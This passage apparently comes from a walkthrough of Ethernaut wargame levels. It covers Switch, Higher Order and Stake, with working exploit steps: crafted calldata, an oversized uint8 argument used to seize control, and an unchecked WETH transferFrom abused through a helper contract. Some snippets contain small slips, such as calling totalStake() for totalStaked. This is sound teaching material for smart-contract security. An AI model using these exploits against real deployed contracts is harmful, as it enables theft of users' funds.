76227e1200000000000000000000000000000000000000000000000000000000 // sig for turnSwitchOn
```

We changed the offset to `0x60` and added the signature of the `turnSwitchOn`
function at the end of the data. The signature of the `turnSwitchOff` function
is still at the 68th position of the calldata.

Let's try it :)

Run
    
```javascript
await web3.eth.sendTransaction({from: player, to: contract.address, data: "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```

and voila, the switch is turned on :)

To confirm:

```javascript
await contract.switchOn() -> true
```

### Learning

From the level itself:

> Assuming positions in CALLDATA with dynamic types can be erroneous, especially when using hard-coded CALLDATA positions.

## Level 30: High Order <a name="level-30-high-order"></a>

As always, let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

Our objective is to become the commander of the contract. The `claimLeadership`
function checks if the `treasury` variable is greater than 255. If it is, the
`commander` variable is set to the address of the caller.

The `treasury` variable is set in the `registerTreasury` function. The `registerTreasury`
takes one `uint8` parameter and stores it in the `treasury` variable. At the same
time it uses inline assembly to store 32 bytes from calldata from offset 4 in the
storage slot of the `treasury`variable.

What does that mean? Based on the knowledge we have from the previous levels,
the first 4 bytes of the calldata contain the function signature, here
`registerTreasury(uint8)`. The next 32 bytes contain the parameter of the function,
which is the `uint8` value.

Let's have a look at it by sending a transaction:

```
await contract.registerTreasury(1)
await web3.eth.getTransaction(<take the hash>)
```
and look at the input field:

```
0x211c85ab0000000000000000000000000000000000000000000000000000000000000001
```
We can see that the first 4 bytes ar ethe function signature and the remaining
32 bytes hold our value :)

So, how are we going to be able to set the `treasury` variable to a value greater
than 255? The `uint8` type can hold values from 0 to 255. That means, we have
to set the `treasury` variable to 256 or greater.

Let's just build our own input:

```
0x211c85ab00000000000000000000000000000000000000000000000000000000deadbeef
```

and send the transaction:

```javascript
await web3.eth.sendTransaction({from: player, to: contract.address, input: "0x211c85ab00000000000000000000000000000000000000000000000000000000deadbeef"})
```

hit enter and wait :) Once it is in the blockchain, let's have a look at the 
`treasury` variable:

```javascript
await contract.treasury().then(v => v.toString()) => '3735928559' 
```

Time to claim the leadership:

```javascript
await contract.claimLeadership()
```

And we are the master of the universe, well at least of the contract :)

### Learning

Even the function signature tells you that the parameter is of type `uint8`, it
does not mean that you can't provide a value greater than 255. The checks are
coming from the code which wraps the contract functions for you, but bits
and bytes are bits and bytes :)

## Level 31: Stake <a name="level-31-stake"></a>

Time to crack some Defi contract ;)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

Our objectives:

 * The contract Eth balance has to be > 0
 * `totalStaked` must be greater than the contract's ETH balance
 * You must be a staker
 * Your stake balance must be 0

Let's have at the functions and see if there is a way to exploit it.

Let's start with the `StakeETH` function. The function requires that the caller
sends more than `0.001` Eth. The function increases the `totalStaked` variable
by the amount of Eth sent, increases the `UserStake` variable of the caller by
the amount of Eth sent and sets the `Stakers` mapping of the caller to true.

Seems all fine so far. No calls to other contracts, no overflow to be spotted,
let's continue.

Let's continue with `Unstake`. The function requires that the caller has a stake
greater than the amount of Eth to be unstaked. The function decreases the `UserStake`
variable of the caller by the amount of Eth to be unstaked, decreases the `totalStaked`
variable by the amount of Eth to be unstaked and sends the amount of Eth to the
caller. After that it returns the boolean value of the success of the transaction.

Funnily it does not check if the call has been successful - aha. Don't forget that :)

Now, let's have a look at the `StakeWETH` function. The function requires that
the amount of Eth to be staked is greater than `0.001` Eth. The function calls
the `WETH` contract with the `0xdd62ed3e` selector and the address of the caller
and the address of the contract. It checks if the contract has an allowance from
us. If it has, it increases the `totalStaked` variable by the amount of Eth to
be staked, increases the `UserStake` variable of the caller by the amount of Eth
to be staked, calls the `WETH` contract with the `0x23b872dd` selector
([transferFrom](https://www.4byte.directory/signatures/?bytes4_signature=0x23b872dd)),
the address of the caller, the address of the contract and the amount of Eth to
be staked and sets the `Stakers` mapping of the caller to true.

Again, it does not check if the call has been successful.

Let's think what can be done.

We as a player can give the contract an allowance from the `WETH` contract
(0.001 WETH as an example), even we do not have any, since the contract tries
to transfer the amount of Eth from the `WETH` contract to the contract but
won't check if it was actually successful.

With this, we would be able to become a staker and set the `totalStaked`
variable would be `0.001`, which is greater than the balance of the contract.

If we unstake everything, the `totalStaked` variable would be set to 0, so
we would need to simulate another staker, which would stake `0.001` Eth.
That means that the balance of the contract is `0.001` Eth and the `totalStaked`
variable is `0.002` Eth.

Let's give the simulated user an additional Wei to stake, since we need to leave
some balance on the contract.

I believe that this should be all. Let's give it a try.

First, we are going to `approve` `0.001` Eth  + 1 Wei for the Stake contract in
the WETH contract. The 1 Wei is because the require statement asks from us to 
deposit more than `0.001` WEth.

For this, we are going to have an interface in remix, use the
address from `contract.WETH()` and call the `approve` function with the address
of the Stake contract and `0.001` Eth + `1` Wei.

```solidity
interface WETH {
    function approve(address spender, uint256 amount) external returns (bool);
}
```
Now time to stake some WETH :)

```javascript
await contract.StakeWETH(1000000000000001)
await contract.totalStake() //=> '1000000000000001' good
await web3.eth.getBalance(contract.address) //=> '0' good
```

Good, now we are going to stake our Eth :)

```javascript
await contract.StakeETH({value: 1000000000000001})
await contract.totalStake() //=> '2000000000000002' good
await web3.eth.getBalance(contract.address) //=> '1000000000000001' good
```

Good, now we are going to create a fake user, who is going to stake
`0.001 Eth + 1 Wei` Eth

```solidity
interface Stake {
    function StakeETH() external payable;
}

contract FakeStaker {

    function sexyStaky(address _stake) external payable {
        // Become a staker with 0.001 ETH + 2 wei (1 will be left behind)
        Stake(_stake).StakeETH{value: msg.value}();
    }
}
```

Deploy and send `0.001 Eth + 2 Wei` to the `sexyStaky` function.

Alright, time to `Unstake` everything using your player's address.

```javascript
await contract.Unstake(2000000000000002)
```

And we are done :)

### Learning

When you do calls to other contracts, always check if the call has been successful.
If you do not check, you might end up in a situation where you think you have
done something, but in reality, you haven't.
